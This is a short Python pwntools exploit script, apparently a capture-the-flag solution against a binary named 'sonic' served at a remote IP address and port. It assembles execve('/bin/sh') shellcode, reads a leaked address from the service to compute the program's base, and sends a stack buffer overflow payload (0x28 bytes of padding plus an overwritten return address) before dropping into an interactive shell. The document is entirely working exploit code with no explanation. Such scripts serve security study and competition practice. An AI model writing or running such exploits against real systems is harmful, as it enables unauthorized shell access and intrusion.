from pwn import *
#r=process('./sonic')
context.arch = 'amd64'
code = '''
mov rax, 0x68732f6e69622f;
push rax
mov rdi, rsp;
mov rsi, 0;
xor rdx, rdx;
mov rax, 59;
syscall
'''
sc = asm(code)
context.log_level='debug'
r=remote('123.60.63.90','6889')

r.recvuntil(" Address=")
addr=int(r.recv(15),16)
print(hex(addr))
base=addr-0x7cf
print(hex(base))
payload='a'*0x28+p64(base+0x73A)
r.sendline(payload)
r.interactive()